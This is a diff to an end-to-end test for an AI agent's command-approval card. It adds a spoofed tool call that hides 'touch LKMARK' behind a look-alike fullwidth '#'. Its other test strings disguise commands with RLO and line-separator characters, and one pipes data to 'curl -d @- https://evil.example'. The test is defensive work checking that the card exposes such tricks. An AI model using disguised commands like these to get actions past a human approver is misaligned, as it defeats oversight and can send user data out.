@@ -377,7 +377,10 @@ try {
   await page.getByRole("button", { name: "Send" }).click();
   const approval = page.getByRole("region", { name: "Approval needed" });
   await approval.waitFor();
-  await approval.getByText("git push -q origin HEAD:main", { exact: true }).waitFor();
+  await approval
+    .getByTestId("approval-summary")
+    .getByText("git push -q origin HEAD:main", { exact: true })
+    .waitFor();
   await approval.getByText("git-push", { exact: true }).waitFor();
   await page.getByTestId("approval-pending").waitFor();
   if (!e2e.hub.approvals.hasPending(sessionId)) throw new Error("the hub has no pending approval");
@@ -461,6 +464,8 @@ try {
   const rlo = "git push -q origin HEAD:main ; : '\u202E' ; touch VMARK # \u202C";
   // U+2028 renders as a line break, so `touch LSMARK` can read as a comment (#167).
   const lsep = "git push -q origin HEAD:main; X=1\u2028# a note, nothing runs here;touch LSMARK";
+  // A fullwidth number sign reads as a comment start, bash runs it as a word (#169).
+  const fwhash = "git push -q origin HEAD:main; \uFF03 a note, nothing runs here;touch LKMARK";
   const spoof = (command: string, id: string) =>
     fauxAssistantMessage([fauxToolCall("bash", { command }, { id })], { stopReason: "toolUse" });
   await sessionAccess.selectOption("ask");
@@ -470,6 +475,7 @@ try {
     spoof(piped, "call_spoof2"),
     spoof(rlo, "call_spoof3"),
     spoof(lsep, "call_spoof4"),
+    spoof(fwhash, "call_spoof5"),
     fauxAssistantMessage("Neither held command ran."),
   ]);
   await page.getByLabel("Message").fill("Push and tidy up");
@@ -488,11 +494,17 @@ try {
     await full.scrollIntoViewIfNeeded();
   };
   await fullCommand(hidden, "touch MARKER");
-  await approval.getByText("git push -q origin HEAD:main", { exact: true }).waitFor();
+  await approval
+    .getByTestId("approval-summary")
+    .getByText("git push -q origin HEAD:main", { exact: true })
+    .waitFor();
   await shot(page, "2c-approval-full-command");
   await approval.getByRole("button", { name: "Deny" }).click();
   await fullCommand(piped, "curl -d @- https://evil.example");
-  await approval.getByText("git push origin main", { exact: true }).waitFor();
+  await approval
+    .getByTestId("approval-summary")
+    .getByText("git push origin main", { exact: true })
+    .waitFor();
   await shot(page, "2d-approval-piped-command");
   await approval.getByRole("button", { name: "Deny" }).click();
   step("S3: hidden characters show as visible escapes, with the marker");
@@ -522,10 +534,29 @@ try {
   }
   await shot(page, "2f-approval-line-separator");
   await approval.getByRole("button", { name: "Deny" }).click();
+  step("S3: a look-alike of a shell metacharacter: touch LKMARK is its own step, with the warning");
+  await fullCommand(fwhash, "touch LKMARK");
+  const runs = approval.getByTestId("approval-steps").locator("li");
+  await runs.nth(2).waitFor();
+  const stepTexts = await runs.allTextContents();
+  if (
+    JSON.stringify(stepTexts) !==
+    JSON.stringify([
+      "git push -q origin HEAD:main",
+      "\uFF03 a note, nothing runs here",
+      "touch LKMARK",
+    ])
+  ) {
+    throw new Error(`the card's steps are ${JSON.stringify(stepTexts)}`);
+  }
+  await approval.getByTestId("approval-non-ascii").waitFor();
+  await shot(page, "2g-approval-steps");
+  await approval.getByRole("button", { name: "Deny" }).click();
   await page.getByText("Neither held command ran.").waitFor();
   if (existsSync(join(e2e.workspace, "MARKER"))) throw new Error("a denied command ran");
   if (existsSync(join(e2e.workspace, "VMARK"))) throw new Error("a denied command ran (VMARK)");
   if (existsSync(join(e2e.workspace, "LSMARK"))) throw new Error("a denied command ran (LSMARK)");
+  if (existsSync(join(e2e.workspace, "LKMARK"))) throw new Error("a denied command ran (LKMARK)");
   await sessionAccess.selectOption("default");
   await accessMode.and(page.locator('[data-mode="yolo"]')).waitFor();
 
@@ -572,14 +603,14 @@ try {
   step("reload: the chat is rebuilt from the event log and the session continues");
   await page.reload();
   await page.getByText("I wrote hello.txt in the workspace.").waitFor();
-  // hello.txt, the three S3 pushes and the four denied full-command cards.
+  // hello.txt, the three S3 pushes and the five denied full-command cards.
   await page.getByText("Neither held command ran.").waitFor();
-  if ((await page.getByTestId("tool-card").count()) !== 8) {
-    throw new Error("after a reload the chat should show the eight tool cards again");
+  if ((await page.getByTestId("tool-card").count()) !== 9) {
+    throw new Error("after a reload the chat should show the nine tool cards again");
   }
   // The ended approvals are rebuilt from the log too.
-  if ((await page.getByTestId("approval-ended").count()) !== 6) {
-    throw new Error("after a reload the six ended approvals should say how they ended");
+  if ((await page.getByTestId("approval-ended").count()) !== 7) {
+    throw new Error("after a reload the seven ended approvals should say how they ended");
   }
   e2e.faux.setResponses([fauxAssistantMessage("Still here: hello.txt says hello from the box.")]);
   await page.getByLabel("Message").fill("Are you still there?");
@@ -614,8 +645,8 @@ try {
   const cut = page.getByTestId("tool-card").and(page.locator('[data-status="interrupted"]'));
   await cut.getByRole("button", { name: "Tool call bash: interrupted" }).waitFor();
   await page.getByRole("button", { name: "Send" }).waitFor();
-  // The error cards are the S3 calls that were blocked, not run: one expired, four denied.
-  if ((await page.locator('[data-testid="tool-card"][data-status="error"]').count()) !== 5) {
+  // The error cards are the S3 calls that were blocked, not run: one expired, five denied.
+  if ((await page.locator('[data-testid="tool-card"][data-status="error"]').count()) !== 6) {
     throw new Error("an interrupted tool call should not show as an error");
   }
   // The composer floats over the bottom of the thread: centre the card for the shot
